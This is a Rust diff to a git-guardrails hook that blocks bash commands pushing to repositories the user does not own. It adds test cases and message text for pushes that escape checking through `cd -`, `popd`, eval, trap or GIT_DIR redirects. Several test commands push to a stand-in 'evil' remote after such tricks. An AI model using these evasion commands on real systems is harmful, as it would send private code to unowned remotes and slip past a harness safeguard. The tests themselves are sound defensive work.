@@ -479,7 +479,8 @@ fn check_pushes_elsewhere(
             "🚫 git-guardrails: Cannot tell which repository this push runs in\n   \
              Something before the push can move it to another repository whose \
              remote cannot be checked: an `eval`, a `trap` action, a `GIT_DIR=`/\
-             `GIT_WORK_TREE=` or `--git-dir`/`--work-tree` redirect, or a prefix \
+             `GIT_WORK_TREE=` or `--git-dir`/`--work-tree` redirect, a `cd -` or \
+             `popd` back to a directory the command never left, or a prefix \
              this guard cannot read past.\n   \
              Fix: run the push from a literal directory, e.g. \
              `cd /path/to/repo && git push origin main`",
@@ -1950,7 +1951,9 @@ mod tests {
                 // repository nudges (ruling on #1095).
                 ("cd \"$DIR\" && git push origin main", Nudge),
                 ("cd \"$VAR\" && git push", Nudge),
-                ("cd - && git push origin feat", Nudge),
+                // `cd -` to the session's `$OLDPWD`, which the command never
+                // recorded, fails closed (cameronsjo/cadence-hooks#1300).
+                ("cd - && git push origin feat", Block),
                 ("cd $(other) && git push origin feat", Nudge),
                 // ...but not when it names the repository already checked.
                 (
@@ -3403,6 +3406,53 @@ mod tests {
                 ("echo \"{p,q}\" 'push'", false),
                 ("printf '%s\\n' {1..3} push", false),
                 ("git status", false),
+            ] {
+                let result = PushRemoteGuard.run(&make_bash_with_cwd(command, &cwd));
+                assert_eq!(
+                    result.outcome == cadence_hooks_core::Outcome::Block,
+                    blocks,
+                    "{command}: {:?}",
+                    result.message
+                );
+            }
+        });
+    }
+
+    /// cameronsjo/cadence-hooks#1300: a push after `cd -` or `popd` is
+    /// judged where the shell returned, from an owned checkout that also has
+    /// an unowned `evil` remote. Each blocking row published a canary under
+    /// bash 5.2; a return the command did not record fails closed.
+    #[test]
+    fn a_push_after_cd_dash_or_popd_is_judged_where_it_returns() {
+        let owned = checkout_with_origin("https://github.com/cameronsjo/x.git");
+        cadence_hooks_core::git_fixtures::git_in(
+            owned.path(),
+            &["remote", "add", "evil", "https://github.com/evil/y.git"],
+        );
+        let cwd = owned.path().to_string_lossy().to_string();
+        with_env(&owners_only(), || {
+            for (command, blocks) in [
+                ("cd /tmp && cd - ; git push evil main", true),
+                ("cd /tmp; cd -; git push evil main", true),
+                ("A[0]=x cd /tmp && cd - ; git push evil main", true),
+                ("FOO=x cd /tmp && cd - ; git push evil main", true),
+                (
+                    "pushd /tmp >/dev/null; popd >/dev/null; git push evil main",
+                    true,
+                ),
+                // Unprovable returns.
+                ("cd - && git push origin main", true),
+                ("popd; git push origin main", true),
+                ("cd /tmp && cd ~- ; git push origin main", true),
+                // Everyday commands pass.
+                ("cd /tmp && cd - ; git push origin main", false),
+                (
+                    "pushd /tmp >/dev/null; popd >/dev/null; git push origin main",
+                    false,
+                ),
+                ("cd /tmp && cd -", false),
+                ("cd -", false),
+                ("popd", false),
             ] {
                 let result = PushRemoteGuard.run(&make_bash_with_cwd(command, &cwd));
                 assert_eq!(
